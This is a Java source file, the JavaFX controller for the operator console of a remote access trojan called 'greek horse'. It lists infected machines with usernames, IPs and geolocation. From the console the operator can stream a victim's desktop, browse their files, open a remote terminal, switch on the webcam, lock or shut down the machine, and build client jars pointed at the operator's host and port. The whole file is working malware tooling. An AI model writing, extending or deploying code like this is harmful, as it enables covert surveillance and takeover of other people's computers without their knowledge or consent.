package greek.horse.server.ui.controllers;

import greek.horse.models.NetInfo;
import greek.horse.server.troyStructure.NetInfoTable;
import greek.horse.server.troyStructure.TroyPlebe;
import greek.horse.server.troyStructure.TroyServer;
import greek.horse.server.ui.ChatApp;
import greek.horse.server.ui.controllers.tasks.BuildJarTask;
import greek.horse.server.ui.controllers.tasks.FileBrowserTask;
import greek.horse.server.ui.formmaters.FormattedTableCellFactory;
import greek.horse.server.ui.formmaters.HorseRowFactory;
import javafx.collections.ListChangeListener;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.geometry.Insets;
import javafx.scene.control.*;
import javafx.scene.image.ImageView;
import javafx.scene.layout.*;
import javafx.scene.paint.Color;
import javafx.scene.text.*;
import javafx.stage.FileChooser;
import javafx.stage.Modality;
import javafx.stage.Stage;
import org.apache.log4j.Logger;

import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.net.URL;
import java.security.CodeSource;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HorseController {

    public TableColumn<NetInfoTable, String> userNameColumn;
    public TableColumn<NetInfoTable, String> ipColumn;
    public TableColumn<NetInfoTable, String> countryColumn;
    public TableColumn<NetInfoTable, String> regionColumn;
    public TableColumn<NetInfoTable, String> cityColumn;
    public TableColumn<NetInfoTable, ImageView> flagColumn;
    public TableColumn<NetInfoTable, String> ispColumn;
    public TableColumn<NetInfoTable, String> osColumn;
    public TableColumn<NetInfoTable, String> bigOsColumn;
    public TableColumn<NetInfoTable, String> headlessColumn;
    public TableView<NetInfoTable> tableView;
    public TextField portStart;
    public TextField portBuild;
    public TextField hostBuild;
    public Button buildBtn;
    public ToggleButton startBtn;
    private Stage stage;

    private TroyServer troyServer;

    private static final Logger log = Logger.getLogger(HorseController.class);
    private final ExecutorService threadPool = Executors.newCachedThreadPool();

    public void startAction(ActionEvent actionEvent) {
        ToggleButton b = (ToggleButton) actionEvent.getSource();
        if (!b.isSelected()) {
            turnOff(b);
        } else {
            turnOn(b);
        }
    }

    private void turnOff(ToggleButton b) {
        b.setTextFill(Color.BLACK);
        portStart.setDisable(false);

        stopServer();
    }

    public void stopServer() {
        if (this.troyServer != null) {
            this.troyServer.isActive().set(false);
            this.troyServer.getPlebes().forEach(ple -> {
                try {
                    ple.getDisconnect().getReceivedObjs(); // .getReceivedObjs() just locks the code here, since client wont answer if disconnected
                } catch (Exception ignored) {
                }
            });
            this.troyServer.stop();
        }
    }

    private void turnOn(ToggleButton b) {
        String port = portStart.getText();
        portStart.setDisable(true);

        if (!port.matches("[0-9]+") || Integer.parseInt(port) > 65535 || Integer.parseInt(port) < 1) {
            showDialog("An invalid port was chosen", "Ooops, looks like the port typed was invalid. Try again.", Alert.AlertType.ERROR);
            b.setSelected(false);
            portStart.setText("");
            portStart.setDisable(false);
            return;
        }

        b.setTextFill(Color.BLUE);
        startServer(Integer.parseInt(port));

    }

    private void startServer(int port) {
        this.troyServer = new TroyServer(port, this);
        threadPool.execute(this.troyServer);
        System.gc();
        startTable();
    }

    private void startTable() {
        ObservableList<TroyPlebe> plebeObservableList = this.troyServer.getPlebes();

//         for demo-ing app
//        for (int i = 0; i < 10; i++) {
//            tableView.getItems().add(new NetInfoTable(new NetInfo("Robert", OS.WINDOWS, "Windows 10", "DESKTOP-DGSDF", "192.168.0.1", "200.98.134.27", "Brazil", "Sao Paulo", "Sao Paulo", "America/Sao_Paulo", "Universo Online S.A.", "Universo Online S.A.", "AS7162 Universo Online S.A.", false), new TroyPlebe("skibidi")));
//            tableView.getItems().add(new NetInfoTable(new NetInfo("Lorem", OS.UNIX, "Fedora 35", "SERVER-WSJDN", "192.168.43.1", "104.244.72.248", "Luxembourg", "Mersch", "Roost", "Europe/Luxembourg", "FranTech Solutions", "BuyVM", "AS53667 FranTech Solutions", true), new TroyPlebe("skibidi")));
//            tableView.getItems().add(new NetInfoTable(new NetInfo("Yuri", OS.MAC, "MacOs X", "DESKTOP-WSJDN", "192.168.13.1", "207.188.139.168", "Spain", "Extremadura", "Badajoz", "Europe/Madrid", "Xtra Telecom S.A", "Xtra Telecom S.A", "AS15704 XTRA TELECOM S.A.", false), new TroyPlebe("skibidi")));
//            tableView.getItems().add(new NetInfoTable(new NetInfo("Jonah", OS.UNIX, "Mint 20.2", "SERVER-WSJDN", "192.168.1.1", "46.29.248.238", "Sweden", "Stockholm County", "Stockholm", "Europe/Stockholm", "Inter Connects Inc", "Sweden", "AS57858 Inter Connects Inc", true), new TroyPlebe("skibidi")));
//            tableView.getItems().add(new NetInfoTable(new NetInfo("Gabriel", OS.UNKNOWN, "Temple OS 5.03", "DESKTOP-WSJDN", "192.168.15.1", "45.137.184.31", "Netherlands", "North Holland", "Amsterdam", "Europe/Amsterdam", "NL-MOTP", "", "AS41047 Bart Vrancken trading as MLaB", false), new TroyPlebe("skibidi")));
//        }

        plebeObservableList.addListener((ListChangeListener<TroyPlebe>) lis -> {
            while (lis.next()) {
                lis.getAddedSubList().parallelStream().forEach(tp ->
                        threadPool.execute(() -> {
                            try {
                                NetInfo netInfo = (NetInfo) tp.getNetInfo().getReceivedObj();
                                if (netInfo != null) {
                                    tableView.getItems().add(new NetInfoTable(netInfo, tp));
                                    tp.setTitle(netInfo.getUserName() + "@" + netInfo.getExternalIP());
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }));

                ArrayList<NetInfoTable> nits = new ArrayList<>();
                lis.getRemoved().parallelStream().forEach(tp ->
                        tableView.getItems().parallelStream()
                                .filter(t -> t.getFather().equals(tp))
                                .forEach(nits::add));
                nits.forEach(t -> tableView.getItems().remove(t));
            }
        });


        formatTable();
    }

    private void formatTable() {
        tableView.getColumns().forEach(c -> c.setCellFactory(new FormattedTableCellFactory<>()));

        flagColumn.setCellValueFactory(c -> c.getValue().imageProperty());
        userNameColumn.setCellValueFactory(c -> c.getValue().userNameProperty());
        ipColumn.setCellValueFactory(c -> c.getValue().ipProperty());
        countryColumn.setCellValueFactory(c -> c.getValue().countryProperty());
        regionColumn.setCellValueFactory(c -> c.getValue().regionProperty());
        cityColumn.setCellValueFactory(c -> c.getValue().cityProperty());
        ispColumn.setCellValueFactory(c -> c.getValue().ispProperty());
        osColumn.setCellValueFactory(c -> c.getValue().osProperty());
        bigOsColumn.setCellValueFactory(c -> c.getValue().bigOsProperty());
        headlessColumn.setCellValueFactory(c -> c.getValue().headlessTextProperty());

        tableView.setRowFactory(new HorseRowFactory(this));
    }


    public void showDialog(String headerText, String contentText, Alert.AlertType type) {
        Alert alert = new Alert(type);
        alert.setTitle(type.toString().substring(0, 1).toUpperCase() + type.toString().substring(1).toLowerCase(Locale.ROOT));
        alert.initOwner(this.stage);
        alert.initModality(Modality.APPLICATION_MODAL);

        alert.setHeaderText(headerText);
        alert.setContentText(contentText);
        alert.showAndWait();
    }

    public void setStage(Stage stage) {
        this.stage = stage;
    }

    public void contextDesktop(TableRow<NetInfoTable> row) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            boolean running = tp.getMonitorDesktopTask().getRunning().get();
            if (!running) {
                tp.getMonitorDesktopTask().getRunning().set(true);
                threadPool.execute(tp.getMonitorDesktopTask());
            }
        } catch (Exception e) {
            log.error("Error getting info from row: ", e);
        }
    }


    public void contextFilesBrowser(TableRow<NetInfoTable> row) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            threadPool.execute(new FileBrowserTask(tp));
        } catch (Exception e) {
            log.error("Error getting info from row: ", e);
        }
    }

    public void contextDisconnect(TableRow<NetInfoTable> row) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            threadPool.execute(tp::getDisconnect);
        } catch (Exception e) {
            log.error("Error getting info from row: ", e);
        }
    }

    public void contextLock(TableRow<NetInfoTable> row, boolean lock) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            threadPool.execute(() -> tp.doToggleLock(lock));

        } catch (Exception e) {
            log.error("Error starting context from row: ", e);
        }
    }

    public void contextStop(TableRow<NetInfoTable> row) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            threadPool.execute(tp::doStop);

        } catch (Exception e) {
            log.error("Error starting context from row: ", e);
        }
    }

    public void buildBtn(ActionEvent event) {
        String host = hostBuild.getText();
        if (host.isEmpty() || host.contains(" ")) {
            showDialog("Host address is invalid", "Something is wrong, fix and try it again.", Alert.AlertType.ERROR);
            return;
        }
        String port = portBuild.getText();
        if (port.isEmpty() || !port.matches("[0-9]+") || Integer.parseInt(port) > 65535 || Integer.parseInt(port) < 1) {
            showDialog("Port number is invalid", "Something is wrong, fix and try it again.", Alert.AlertType.ERROR);
            return;
        }

        CodeSource src = ChatApp.class.getProtectionDomain().getCodeSource();
        URL jar = src.getLocation();

        if (!jar.getFile().contains(".jar")) {
            showDialog("Can't access jar", "To build the client, it's necessary to run this horse from the .jar version. To build it, use something like: 'compile package -Dmy.mainClass=greek.horse.server.ui.Launcher'", Alert.AlertType.ERROR);
            return;
        }

        FileChooser fileChooser = new FileChooser();
        fileChooser.setInitialDirectory(FileSystemView.getFileSystemView().getHomeDirectory());
        fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("Jar file", "*.jar"));
        File saveFile = fileChooser.showSaveDialog(stage);

        if (saveFile == null || saveFile.exists()) {
            showDialog("Invalid save location", "Make sure the file doesn't exist (overwriting is not supported), and that you haven't just closed the ask dialog (you need to choose something)", Alert.AlertType.ERROR);
            return;
        }

        BuildJarTask buildTask = new BuildJarTask(saveFile, this, host, port);
        threadPool.execute(buildTask);
        this.buildBtn.setDisable(true);
        showDialog("Wait until done", "The jar is being built in the background. You'll be notified when it's done.", Alert.AlertType.WARNING);

    }

    public void contextChat(TableRow<NetInfoTable> row) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            boolean running = tp.getChatTask().getRunning().get();
            if (!running) {
                tp.getChatTask().getRunning().set(true);
                threadPool.execute(tp.getChatTask());
            }
        } catch (Exception e) {
            log.error("Error getting info from row: ", e);
        }

    }

    public void contextTerminal(TableRow<NetInfoTable> row) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            boolean running = tp.getTerminalTask().getRunning().get();
            if (!running) {
                tp.getTerminalTask().getRunning().set(true);
                threadPool.execute(tp.getTerminalTask());
            }
        } catch (Exception e) {
            log.error("Error getting info from row: ", e);
        }
    }

    public void contextFullData(TableRow<NetInfoTable> row) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            Alert alert = new Alert(Alert.AlertType.INFORMATION);
            alert.setTitle("Full data - " + tp.getTitle());
            alert.initOwner(stage);
            alert.initModality(Modality.WINDOW_MODAL);

            NetInfo netInfo = (NetInfo) tp.getNetInfo().getReceivedObj();

            List<String> names = Arrays.asList(
                    "User name: ",
                    "OS: ",
                    "Big OS: ",
                    "Headless: ",
                    "Host name: ",
                    "Local IP: ",
                    "External IP: ",
                    "Country: ",
                    "Region: ",
                    "City: ",
                    "Time zone: ",
                    "ISP: ",
                    "ORG: ",
                    "AS: "
            );

            List<String> values = Arrays.asList(
                    netInfo.getUserName(),
                    netInfo.getOs().toString(),
                    netInfo.getBigOs(),
                    String.valueOf(netInfo.isHeadless()),
                    netInfo.getHostName(),
                    netInfo.getLocalIP(),
                    netInfo.getExternalIP(),
                    netInfo.getCountry(),
                    netInfo.getRegion(),
                    netInfo.getCity(),
                    netInfo.getTimeZone(),
                    netInfo.getIsp(),
                    netInfo.getOrg(),
                    netInfo.getAs()
            );

            TextFlow textFlow = new TextFlow();
            textFlow.setBackground(new Background(new BackgroundFill(Color.WHITE, new CornerRadii(0), new Insets(0))));
            Border border = new Border(new BorderStroke(Color.GREY, BorderStrokeStyle.SOLID, new CornerRadii(0), new BorderWidths(1), new Insets(5)));
            textFlow.setPadding(new Insets(5));
            textFlow.setBorder(border);
            textFlow.setFocusTraversable(true);

            for (int i = 0; i < names.size(); i++) {
                Text nameText = new Text(names.get(i)+" ");
                nameText.setFill(Color.BLUE);
                nameText.setFont(Font.font("System", FontWeight.NORMAL, FontPosture.REGULAR, 16));

                Text valueText = new Text(values.get(i)+"\n");
                valueText.setFill(Color.BLACK);
                valueText.setFont(Font.font("System", FontWeight.NORMAL, FontPosture.REGULAR, 16));

                textFlow.getChildren().addAll(nameText, valueText);
            }


            alert.getDialogPane().setContent(textFlow);
            alert.setHeaderText("Query Info");
            alert.showAndWait();

        } catch (Exception e) {
            log.error("Error getting info from row: ", e);
        }
    }

    public void contextOff(TableRow<NetInfoTable> row) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            tp.turnOff();
        } catch (Exception e) {
            log.error("Error getting info from row: ", e);
        }
    }

    public void contextWebcam(TableRow<NetInfoTable> row) {
        try {
            TroyPlebe tp = row.getItem().getFather();
            boolean running = tp.getWebcamTask().getRunning().get();
            if (!running) {

                List<String> list = (List<String>) tp.getWebcamCount().getReceivedObj();
                if (list.isEmpty()){
                    showDialog("No webcams found", "Plebe has no webcams available.", Alert.AlertType.ERROR);
                    return;
                }

                tp.getWebcamTask().getRunning().set(true);
                threadPool.execute(tp.getWebcamTask());
            }
        } catch (Exception e) {
            log.error("Error getting info from row: ", e);
        }
    }
}

























